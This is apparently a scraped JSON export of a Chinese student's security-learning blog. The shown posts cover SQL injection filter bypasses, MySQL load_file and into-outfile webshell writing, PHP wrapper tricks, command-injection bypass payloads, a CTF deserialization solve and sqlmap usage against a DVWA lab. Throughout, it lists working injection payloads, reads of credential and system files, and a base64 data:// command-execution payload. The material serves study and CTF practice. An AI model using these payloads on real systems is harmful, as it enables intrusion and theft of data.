1.双写绕过如：union————uunionnion 2.大小写绕过如：union————uNion 3.空格绕过 /**/ 两个空格代替一个空格，用 Tab 代替空格，%a0=空格 %20 %09 %0a %0b %0c %0d %a0 %09 TAB 键（水平） %0a 新建一行 %0c 新的一页 %0d return 功能 %0b TAB 键（垂直） %a0 空格 `` 反引号绕过空格 payload：select * from users where user_id=1 limit 0,1; () 括号绕过空格 4.等号绕过like代替= &lt;&gt;等价于!=所以我们可以在&lt;&gt;前加个!就变成等于了。 例如:id=-1’ union select * from users where ! (id&lt;&gt;2)%23 5.宽字节注入过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 &#39; 。 在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字： %df 吃掉 \\ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面： id=-1%df%27union select 1,user(),3–+ %df %de %e0 %e1等字符可以与%5c（’&#39;）结合成为一个字符 安全狗绕过测试","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://alunxzhou.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"下载漏洞","slug":"下载漏洞","date":"2023-01-07T07:28:39.000Z","updated":"2023-01-07T07:31:04.434Z","comments":true,"path":"2023/01/07/下载漏洞/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"随即点击一个图片下载 查看下载地址 再随机下载一个图片 查看地址 对比地址发现filename以后的文件名不同，其余相同 我们可以得到filename后面可以任意查看文件的信息 可以构造payload","categories":[{"name":"下载漏洞","slug":"下载漏洞","permalink":"http://alunxzhou.github.io/categories/%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"网安基础总结八","slug":"网安基础总结八","date":"2022-12-04T07:23:35.000Z","updated":"2023-01-07T07:27:54.794Z","comments":true,"path":"2022/12/04/网安基础总结八/","link":"","permalink":"http://alunxzhou.github.io/2022/12/04/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AB/","excerpt":"思考总结Mysql注入中load_file()与select into outfile命令load_file()查看某个文件的内容","text":"思考总结Mysql注入中load_file()与select into outfile命令load_file()查看某个文件的内容 看过《SQL Injection with MySQL》的朋友肯定知道用char()函数或者把字符转换成16进制。 注：当前条件为magic_quotes_gpc=on, c:/boot.ini可读。 我们构造**$id**为： -1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) “char(99,58,47,98,111,111,116,46,105,110,105)”就是”c:/boot.ini”的ASCII代码。 我们的查询语句就变成： select * from article where articleid=-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) 这样我们也可以成功读取boot.ini文件，还有把字符转换为16进制的： “c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”,16进制前需要加0x 所以上面的语句就变成： select * from article where articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) 在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们可以用into outfile把文件导出 关于mysql into outfile注射，要使用into outfile把代码写到web目录取得webshell首先需要3大先天条件： 1、知道物理路径（into outfule ‘物理路径’), 这样才能写对目录。 2、能够使用union （需要mysql 3以上的版本） 3、对方没有对（’）进行过滤（因为outfile后面的（’’）不可以用其他函数代替转换） 后天条件需要二个： 1、就是mysql用户拥有file_priv权限（不然就不能写文件或读文件） 2、对web目录有写权限MS的系统就不说了，一般都会有权限的，但是*nix的系统，通常都是rwxr-xr-x 也就是说组跟其他用户都没有权限写操作，所以，要满足这5大条件还是蛮高难度的 常见用法mysql的load_file()常见的用法： 1、replace(load_file(0×2F6574632F706173737764), 0x3c, 0x20) 2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32)) 上面两个是查看一些php文件里完全显示代码。有些时候不替换一些字符，如”&lt;”替换成”空格”,返回的是网页。 而无法查看到代码。 3、load_file(char(47))可以列出FreeBSD, Sunos系统根目录。 4、/etc/httpd/conf/httpd.conf或者/usr/local/apache/conf/httpd.conf查看linux apache虚拟主机配置文件。 5、c:/Program Files/Apache Group/Apache/conf/httpd.conf或c:/apache/conf/httpd.conf 查看windows系统 apache文件。 6、c:/Resin-3.0.14/conf/resin.conf 或c:/Resin/conf/resin.conf 查看jsp开发网站的resin文件配置信息。 7、/usr/local/resin/conf/resin.cof 查看linux系统配置的JSP虚拟主机 8、../themes/darkblue_orange/layout.inc.php phpmyadmin爆路径 9、c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件 10、/usr/local/resin-3.0.22/conf/resin.conf 或 /usr/local/resin-pro-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 11、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf Apache虚拟主机查看 12、/etc/sysconfig/iptables 查看防火墙策略 13、usr/local/app/php5/lib/php.ini PHP的设置 14、/etc/my.cnf Mysql的配置文件 15、c:/mysql/data/mysql/user.MYD 存在MYSQL系统中的用户密码 16、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP 17、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf 虚拟网站设置 参考https://cloud.tencent.com/developer/article/1918345 select into outfile命令在mysql数据库中存在mysql select into outfile命令，该命令与load data infile命令作用恰好相反。该命令的作用是将被选择的一行写入一个文件中。（文件被创建到服务器主机上） 但是，需要注意的是：into outfile和load_file()两种方式的利用都是具有局限性的。 其中，into outfile的使用前提是： 1.要知道网站的绝对路径，可以通过报错信息、phpinfo界面、404界面等一些方式知道 2.要有file权限，默认情况下只有root权限有 3.对目录要有写权限，一般image之类的存放图片的目录有写权限 还要注意的是：写的文件名一定是在网站中不存在的，不然也会不成功 select …… into outfile ‘filename’常见的利用方式： 1.直接写进文件里 select version() into outfile “绝对路径”,其中version()可以换成其余的查询数据库信息的函数 version()左右不需要加单引号 2.修改文件结尾 select ‘‘ into outfile “xxx/test.php”,这里需要获取到网站在系统中的具体路径(绝对路径) 写入内容需要加单引号(不能加双引号) 那么好，现在我们知道了select…… into outfile的利用方法了 首先，根据前面几题的经验，我们可以知道该网站目录的绝对路径，且用户是root权限的。那么就满足了我们使用outfile 去获取网站信息的使用前提条件 查版本号 蚁剑连接 参考https://www.freebuf.com/articles/web/275874.html https://blog.csdn.net/weixin_44377973/article/details/109265546 一道反序列化 打开一看啥也没有，看看源码 根据以上源码泄露，是文件包含漏洞，配合封装协议读取文件源码包含了class.php文件。这里得讲到file_get_contents()函数file_get_contents() 函数把整个文件读入一个字符串中。这里的字符串是$user参数接受的，利用它的文件封装协议来读取$file参数include的文件当然这里要使第一个条件成立。还需要讲到一个文件封装协议php://input 是个可以访问请求的原始数据的只读流第一个条件：if(isset($user)&amp;&amp;(file_get_contents($user,’r’)===”admin”))使$user的值等于admin，并且使$user接收读入的文件可利用php://input绕过 成功绕过现在利用php伪协议读取class.php源码，格式为base64加密 我们构造反序列化的参数：O:4:”Read”:1:{s:4:”file”;s:57:”php://filter/read=convert.base64-encode/resource=f1a9.php”;}这里也是利用php://filter来读取flag文件 base64解密后 &lt;?phperror_reporting(E_ALL &amp; ~E_NOTICE); class Read&#123;//f1a9.php public $file; public function __toString()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); &#125; return &quot;__toString was called!&quot;; &#125;&#125;?&gt; 我们构造反序列化的参数：O:4:”Read”:1:{s:4:”file”;s:57:”php://filter/read=convert.base64-encode/resource=f1a9.php”;} 这里也是利用php://filter来读取flag文件 解密后 &lt;?phperror_reporting(E_ALL &amp; ~E_NOTICE);//flag&#123;hSh_ctf:e@syt0g3t&#125;?&gt;","categories":[{"name":"网安基础篇","slug":"网安基础篇","permalink":"http://alunxzhou.github.io/categories/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"web基础","slug":"web基础","permalink":"http://alunxzhou.github.io/tags/web%E5%9F%BA%E7%A1%80/"}]},{"title":"网安基础总结七","slug":"网安基础总结七","date":"2022-11-13T07:19:55.000Z","updated":"2023-01-07T07:22:53.203Z","comments":true,"path":"2022/11/13/网安基础总结七/","link":"","permalink":"http://alunxzhou.github.io/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/","excerpt":"一、学习记录1.1git泄露既然题目提示了git泄露漏洞，那么直接下载源码","text":"一、学习记录1.1git泄露既然题目提示了git泄露漏洞，那么直接下载源码 python2 GitHack.py http://challenge-924aa806bf44244c.sandbox.ctfhub.com:10800/.git/ cd E:\\tools\\githack\\dist\\challenge-924aa806bf44244c.sandbox.ctfhub.com_10800 git log //查看历史记录 git diff 57a6016556eba2e627e194b58d11833dec535a37 //比较版本 2.1php伪协议PHP的配置选项allow_url_include为ON的话，则include/require函数可以加载远程文件，这种漏洞被称为”远程文件包含漏洞(Remote File Inclusion RFI)”。 allow_url_fopen = On 是否允许打开远程文件 allow_url_include = On 是否允许include/require远程文件 常用到伪协议的php://input和php://filter.其中php://input要求allow_url_include设置为On file=php://filter/read=convert.base64-encode/resource=index.php ?page=data://text/plain, ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4= 2.2RCE之命令执行中的各种绕过2.2.1常见管道符绕过windows “|”：直接执行后面的语句。 “||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。 “&amp;”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。 “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。 linux “;”：执行完前面的语句再执行后面的语句。 “|”：显示后面语句的执行结果。 “||”：当前面的语句执行出错时，执行后面的语句。 “&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。 “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。 2.2.2空格及关键词过滤绕过我们使用ls flag_is_here列出子目录的文件，免不了绕过空格和flag的顾虑，绕过空格前面已经有writeup中附带了相关技巧，我们这里使用${IFS}绕过 绕过flag关键字，我们使用的方法也是多种多样，这里不一一列出了，经过尝试可以使用(来绕过关键字过滤，如fl)ag_is_here $IFS 是一种 set 变量，当 shell 处理”命令替换”和”参数替换”时，shell 根据 IFS 的值，默认是 space,tab, newline 即空格，制表符，空行来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。 直接用$IFS的话，会认为解析没结束，会把后面的也当做参数解析，比如cat$IFSflag.php，会把IFSflag一起当变量解析。这时候需要在$IFS后面进行截断，使解析为空，结束 $IFS，正常执行后面的内容。 cat$IFS$1flag.php //使用特殊变量 cat${IFS}flag.php //使用{} cat$IFS’f’lag.php //使用引号 cat$IFS\\flag.php //使用转义符 cat$IFS?lag.php //使用通配符 在PHP下，空格可以使用%09(tab)、%0a(换行)替代 2.2.3引入绕过空格过滤的字符：&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等 2.2.4运算符过滤绕过首先我们要使用ls列目录，发现这里过滤了运算符，绕过的方式有%0a、%0d、%0D%0A。 2.2.5引号绕过c’at’|c”at”|c``at|c\\at 当cat命令被过滤时，可以用以下命令代替： tac|more|less|curl|nl|tail|sort|strings|head|paste|od -a strings：显示文件中的可打印内容，一般用来查看非文本内容 sort：可针对文本文件的内容，以行为单位来排序。 curl：会发送 GET 请求来获取链接内容到标准输出 head：只显示前几行内容，如果文本较长，需要加上参数 -n paste：会把每个文件以列对列的方式，一列列地加以合并。 2.2.6通配符绕过*和?是Linux中的两种通配符，可以用他们代替关键字 cat * //输出当前目录下所有文件内容 /bin/c?t fl?g.php 2.2.7命令执行通杀payload（来自Y4大佬）（依据题目而定）payload1:c=nl%09fla\\g.php|| payload2:c=nl%09fla\\g.php%0a payload3:c=nl%09fla’’g.php%0a payload4:c=nl%09fla””g.php%0a payload5:c=vi%09fla\\g.php%0a payload6:c=tac%09fla\\g.php%0a payload7:c=uniq%09fla\\g.php%0a payload8:c=nl&lt;fla’’g.php|| payload9:c=nl%09fla\\g.php%26 2.2.8无参数rcelocaleconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.) pos()：返回数组中的当前元素的值。 array_reverse()：数组逆序 scandir()：获取目录下的文件 next()：函数将内部指针指向数组中的下一个元素，并输出。 首先通过 pos(localeconv())得到点号，因为scandir(’.’)表示得到当前目录下的文件，所以scandir(pos(localeconv()))就能得到flag.php了。 2.2.9命令分隔符表示我们要让命令回显，那么进行命令分隔即可 ; //分号 | //只执行后面那条命令 || //只执行前面那条命令 &amp; //两条命令都会执行 &amp;&amp; //两条命令都会执行 2.3.0参考链接https://www.cnblogs.com/pursue-security/p/15291426.html 3.1linux日志文件 root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin desktop:x:80:80:desktop:/var/lib/menu/kde:/sbin/nologin mengqc:x:500:500:mengqc:/home/mengqc:/bin/bash 在该文件中，每一行用户记录的各个数据段用“：”分隔，分别定义了用户的各方面属性。各个字段的顺序和含义如下： 注册名：口令：用户标识号：组标识号：用户名：用户主目录：命令解释程序 (1)注册名(login_name)：用于区分不同的用户。在同一系统中注册名是惟一的。在很多系统上，该字段被限制在8个字符(字母或数字)的长度之内；并且要注意，通常在Linux系统中对字母大小写是敏感的。这与MSDOS/Windows是不一样的。 (2)口令(passwd)：系统用口令来验证用户的合法性。超级用户root或某些高级用户可以使用系统命令passwd来更改系统中所有用户的口令，普通用户也可以在登录系统后使用passwd命令来更改自己的口令。 现在的Unix/Linux系统中，口令不再直接保存在passwd文件中，通常将passwd文件中的口令字段使用一个“x”来代替，将/etc /shadow作为真正的口令文件，用于保存包括个人口令在内的数据。当然shadow文件是不能被普通用户读取的，只有超级用户才有权读取。 此外，需要注意的是，如果passwd字段中的第一个字符是“*”的话，那么，就表示该账号被查封了，系统不允许持有该账号的用户登录。 (3)用户标识号(UID)：UID是一个数值，是Linux系统中惟一的用户标识，用于区别不同的用户。在系统内部管理进程和文件保护时使用 UID字段。在Linux系统中，注册名和UID都可以用于标识用户，只不过对于系统来说UID更为重要；而对于用户来说注册名使用起来更方便。在某些特 定目的下，系统中可以存在多个拥有不同注册名、但UID相同的用户，事实上，这些使用不同注册名的用户实际上是同一个用户。 (4)组标识号(GID)：这是当前用户的缺省工作组标识。具有相似属性的多个用户可以被分配到同一个组内，每个组都有自己的组名，且以自己的组标 识号相区分。像UID一样，用户的组标识号也存放在passwd文件中。在现代的Unix/Linux中，每个用户可以同时属于多个组。除了在 passwd文件中指定其归属的基本组之外，还在/etc/group文件中指明一个组所包含用户。 (5)用户名(user_name)：包含有关用户的一些信息，如用户的真实姓名、办公室地址、联系电话等。在Linux系统中，mail和finger等程序利用这些信息来标识系统的用户。 (6)用户主目录(home_directory)：该字段定义了个人用户的主目录，当用户登录后，他的Shell将把该目录作为用户的工作目录。 在Unix/Linux系统中，超级用户root的工作目录为/root；而其它个人用户在/home目录下均有自己独立的工作环境，系统在该目录下为每 个用户配置了自己的主目录。个人用户的文件都放置在各自的 主目录下。 (7)命令解释程序(Shell)：Shell是当用户登录系统时运行的程序名称，通常是一个Shell程序的全路径名， 如/bin/bash。 需要注意的是，系统管理员通常没有必要直接修改passwd文件，Linux提供一些账号管理工具帮助系统管理员来创建和维护用户账号。 Linux口令管理之/etc/passwd文件 /etc/passwd文件是Linux/UNIX安全的关键文件之一.该文件用于用户登录时校验 用户的口令,当然应当仅对root可写.文件中每行的一般格式为: LOGNAME:PASSWORD:UID:GID:USERINFO:HOME:SHELL ​ nginx的日志文件为/var/log/nginx/access.log 3.1.1参考链接https://www.jianshu.com/p/fbb132422c9d 4.1正则表达式修正符正则表达式中常用的模式修正符有i、g、m、s、U、x、a、D、e 等。 它们之间可以组合搭配使用。 i 不区分(ignore)大小写； 例如: /abc/i 可以匹配 abc、aBC、Abc g 全局(global)匹配 如果不带g，正则过程中字符串从左到右匹配，找到第一个符合条件的即匹配成功，返回 如果带g，则字符串从左到右，找到每个符合条件的都记录下来，知道字符串结尾位置 例如: var str = ‘aaaaaaaa’ var reg1 = /a/; str.match(reg1) // 结果为：[“a”, index: 0, input: “aaaaaaaa”] var reg2 = /a/g; str.match(reg2) // 结果为：[“a”, “a”, “a”, “a”, “a”, “a”, “a”, “a”] m 多(more)行匹配 若存在换行\\n并且有开始^或结束$符的情况下，和g一起使用实现全局匹配, 因为存在换行时默认会把换行符作为一个字符任务匹配字符串是个单行， g只匹配第一行，添加m之后实现多行，每个换行符之后就是开始 var str = “abcggab\\nabcoab”; var preg1 = /^abc/gm; str.match(preg1) // 结果为：[“abc”, “abc”] var preg2 = /ab$/gm; str.match(preg2) // 结果为：[“ab”, “ab”] s 特殊字符圆点 . 中包含换行符 默认的圆点 . 是 匹配除换行符 \\n 之外的任何单字符，加上s之后, . 中包含换行符 $str = “abggab\\nacbs”; $preg = “/b./s”; preg_match_all($preg, $str,$matchs); print_r($matchs);//Array ( [0] =&gt; Array ( [0] =&gt; bg [1] =&gt; b [2] =&gt; bs ) ) U 只匹配最近的一个字符串;不重复匹配; $mode=”/a(.*?)c/“; $preg=”/a.*c/U”;//这两个正则返回相同的值 $str=”abcabbbcabbbbbc” ; preg_match($mode,$str,$content); echo $content[0];//abc preg_match($preg,$str,$content); echo $content[0];//abc //修正符:x 将模式中的空白忽略; //修正符:A 强制从目标字符串开头匹配; //修正符:D 如果使用$限制结尾字符,则不允许结尾有换行; //修正符:e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; 4.1.1参考链接https://www.cnblogs.com/kevin-yuan/archive/2012/09/25/2702167.html 5.1MISC5.1.1伪加密用010hex打开zip文件。 把504B0304后的第3、4个byte改成0000还有 把504B0102后的第5、6个byte改成0000即可破解伪加密。 ##识别真假加密 无加密 压缩源文件数据区的全局加密应当为00 00 且压缩源文件目录区的全局方式位标记应当为00 00 假加密 压缩源文件数据区的全局加密应当为00 00 且压缩源文件目录区的全局方式位标记应当为09 00 真加密 压缩源文件数据区的全局加密应当为09 00 且压缩源文件目录区的全局方式位标记应当为09 00 5.1.2工具stefhideSteghide是一个可以将文件隐藏到图片或音频中的工具 隐藏文件 steghide embed -cf [图片文件载体] -ef [待隐藏文件] steghide embed -cf 1.jpg -ef 1.txt 查看图片中嵌入的文件信息 steghide info 1.jpg 提取图片中隐藏的文件 steghide extract -sf 1.jpg 使用steghide发现图片有隐写文件，使用steghide extract -sf good.jpg，空密码即可 https://blog.csdn.net/Aluxian_/article/details/121968033 5.1.3工具F5-steganographyf5隐写，利用工具：F5-steganography: https://github.com/matthewgao/F5-steganography 命令：java Extract C:\\Users\\alun\\OneDrive\\桌面\\Misc.jpg 会在f5隐写工具的目录下生成文件夹 二、学习总结2022年11月12日八点半到十一点，打了安工第一届信安大赛，有些感悟。 这次比赛属于新生赛，赛题都比较简单，可惜我没有写出几题，结果有些不尽人意。 说一下为什么。 缺乏做题经验，web题目四道写出两道，re写两道，pwn写一道，misc写一道，好像没了，写出来的这几题都很简单，动动手就出了，没写出来的也没觉得很难，很多都是出了一般，没思路了。对于Crypto这一类更是一题都不会做，主要不会写脚本…… 这两天写了一些MISC题目，总结了以下几点思路 1.对于图片隐写这类题型，先看属性，说不定有惊喜。属性中可能带有描述，以及分辨率，对于分辨率我们可以判断图片是否缺少，若缺少就用winhex修改图片的宽高。有些flag直接用winhex查找字符串就能得到。 2.第二步用winhex打开查看文件头，每个类型的文件都有不同类型的文件头，说不准某些png，jpg文件中会有zip头部，这样直接修改后缀为zip解压或是扔到kali用binwalk分离。 3.有些压缩包中的文件解压需要密码，这时就要看是否为伪加密，判断加密类型之后题目大概就能做出来了。 4.有些题目中给了压缩密码的提示，比如四位纯数字，这时我们就可以直接用ziperllo（破解rar文件）与ARCHPR(破解zip文件)爆破密码。 5.对于LSB类的题目，首先扔进Stegsolve中对其RGB调整为0，查看hex，根据hex保存其文件类型，比如PK头就是zip文件类型等等。 6.对于二次解压题目，需要将隐藏文件用foremost分离。 7.流量分析题目就查看流量包，然后追踪http或者tcp流（还需做题加深一下） 8.二维码之类的题目，若完整就用CQR识别,不完整就想办法补充完整。 差不多就这些，以后再做补充。 三、下周计划下周主攻MISC，学一下python脚本编写。副攻web中的命令执行和php特性这类题目。 加油(ง •_•)ง","categories":[{"name":"网安基础篇","slug":"网安基础篇","permalink":"http://alunxzhou.github.io/categories/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"web基础","slug":"web基础","permalink":"http://alunxzhou.github.io/tags/web%E5%9F%BA%E7%A1%80/"}]},{"title":"网安基础总结六","slug":"网安基础总结六","date":"2022-10-30T07:17:07.000Z","updated":"2023-01-07T07:19:19.874Z","comments":true,"path":"2022/10/30/网安基础总结六/","link":"","permalink":"http://alunxzhou.github.io/2022/10/30/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AD/","excerpt":"一、学习内容1.1dirsearch下载及使用 GitHub的下载地址为：https://github.com/maurosoria/dirsearch","text":"一、学习内容1.1dirsearch下载及使用 GitHub的下载地址为：https://github.com/maurosoria/dirsearch 1.1.1命令使用python.exe dirsearch.py -h可以查看到各种命令。 常用：dirsearch.py -u ip地址 -e ​ -u 指定url -e 指定网站语言 -w 可以加上自己的字典（带上路径） 例如： 1.2修改请求头为本地访问X-Forward-For：127.0.0.1 Referer：127.0.0.1 1.3xss漏洞在登录界面随便输入一个账号密码，看一下返回的信息若得到错误的信息，发现url里面有get类型的错误参数，如果没有过滤的话我们将文字替换为alert('1')可以得到xss漏洞，没有过滤，拿下xss。 1.4端口号对应服务HTTP 80 ​ HTTPS 443 ​ Telnet 23 ​ FTP 221 ​ SSH（远程登录）SCP（文件传输），端口重定向 22 ​ SMTP 25 ​ POP3 110 ​ WebLogic 7001 ​ TOMCAT 8080 ​ WIN2003远程登录 3389 ​ Oracle数据库 1521 ​ MS SQL*SEVER数据库sever 1433 ​ MySQL数据库sever 3306 2.1掌握php弱类型比较2.1.1php中其中两种比较符号:==：先将字符串类型转化成相同，再比较===：先判断两种字符串的类型是否相等，再比较字符串和数字比较使用==时,字符串会先转换为数字类型再比较var_dump(‘a’ == 0);//true，此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0。var_dump(‘123a’ == 123);//true，这里’123a’会被转换为123。 var_dump(‘a123’ == 123);//false，因为php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。举例：var_dump(‘123a1’ == 123);//truevar_dump(‘1233a’ == 123);//false&lt;、&gt;、&lt;=、&gt;=都存在和==相同的弱类型 &lt;?phpshow_source(__FILE__);include(&quot;config.php&quot;);$a=@$_GET[&#x27;a&#x27;];$b=@$_GET[&#x27;b&#x27;];if($a==0 and $a)&#123; echo $flag1;&#125;if(is_numeric($b))&#123; exit();&#125;if($b&gt;1234)&#123; echo $flag2;&#125;?&gt; (1)这里包含了config.php(2)url接收参数a和b的值(3)如果$a等于0 and flag1(4)如果b&gt;1234，输出$flag2 if(true and true){ //这里$a==0 and $a，==为弱类型比较，字符串开头都为0，所以0==0 and ‘b’，因为字符串b存在，所以and后面也为true，所以双true，最后if括号里为true，执行if下面的语句 echo $flag1;&#125;if(is_numeric(2222a))&#123;exit();&#125;if(2222a&gt;1234)&#123;echo $flag2; 3.1sql手工注入3.1.1万能密码admin&#x27; --admin&#x27; #admin&#x27;/*&#x27; or 1=1--&#x27; or 1=1#&#x27; or 1=1/*&#x27;) or &#x27;1&#x27;=&#x27;1--&#x27;) or (&#x27;1&#x27;=&#x27;1-- 3.1.2mysql常见名称schema_name 储存了所有数据库的库名tables 储存了数据库库名，以及该库中包含的表名table_schema 储存了数据库名table_name 储存了表名 3.1.3手工注入命令爆表1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#爆列1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=’dvwa’# 3.1.4有回显的手工SQL注入步骤mysql的注释可以是#或者– ，注意–后面有空格，可以写成– ss这样比较不容易漏掉空格。此外如果在url中用#要进行url编码，写为%23。 1、找注入点 2、找闭合，常见的有单引号、双引号（字符型），无闭合（数值型） 确定 3、确定列数 order by 4、确定字段类型 union select 5、爆库 union select 1,database() 爆表 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761 （0x64767761是dvwa的ascii码） 爆列 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;dvwa&#x27;union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=0x64767761 爆内容 union select group_concat(user),group_concat(password) from users 3.2sqlmap注入1、如果是post型，可以先burpsuite抓包保存为txt 2、找注入点（可以省略） python sqlmap.py -u “http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” （GET型，如果需要认证身份要加cookie） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\medium.txt” （POST型） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\high.txt” –second-url “http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot; （POST型，输入和回显不在同一个页面) 3、爆库 python sqlmap.py -u “http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” -dbs （GET型，全部可访问的数据库） python sqlmap.py -u “http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –current-db （GET型，当前数据库） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\medium.txt” –current-db （POST型，当前数据库） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\high.txt” –second-url “http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot; –current-db （POST型，输入和回显不在同一个页面，当前数据库） 4、爆表 python sqlmap.py -u “http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –tables -D dvwa （GET型） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\medium.txt” –tables -D dvwa （POST型） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\high.txt” –second-url “http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot; –tables -D dvwa （POST型，输入和回显不在同一个页面) 5、爆列 python sqlmap.py -u “http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –columns -D dvwa -T users （GET型） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\medium.txt” –columns -D dvwa -T users （POST型） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\high.txt” –second-url “http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot; –columns -D dvwa -T users （POST型，输入和回显不在同一个页面) 6、爆内容 python sqlmap.py -u “http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –dump -D dvwa -T users -C “user,password” （GET型） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\medium.txt” –dump -D dvwa -T users -C “user,password” （POST型） python2 sqlmap.py -r “E:\\渗透测试学习资料\\dvwa\\sqli\\high.txt” –second-url “http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot; –dump -D dvwa -T users -C “user,password” （POST型，输入和回显不在同一个页面) 3.3SQL注入防御SQL注入形成的原因是数据和代码没分离，用户可控的数据可以作为SQL语句执行。 因此防御sql注入最有效的方法是使用预编译语句，就像IMPOSSIBLE关这样。 预编译之后输入的参数不会再进行SQL编译，SQL语句的语义不会发生变化。 除此之外，也可以采用安全的存储过程，但存储过程本身可能存在注入；检查输入的数据类型也是有用的，但不是万能的；使用安全函数，注意数据库的最小权限原则也是有利的。 4.1php正则匹配元字符： \\d 匹配任意一个0-9的数字 \\D 匹配任意一个除十进制数以外的字符，等价于[^0-9] \\s 匹配任意一个空白的字符，比如换页符、换行符、回车符号、制表符、垂直制表符 \\S 匹配出空白字符以外的所有字符 \\w 匹配任意一个数字或字母或下划线 \\W 匹配除数字、字母、下划线以外的任意字符 . 匹配除换行符以外的任意一个字符 * 匹配0次，或1次、或多次其前面字符 + 匹配1次或多次其前面的字符 ？ 匹配0次或1次前面的字符 {n} 表示其前面字符恰好出现n次 {n,} 表示其前面字符出现不少于n次 {n,m} 表示其前面的字符至少出现n次，最多出现m次 ^或\\A 匹配字符串开始的位置 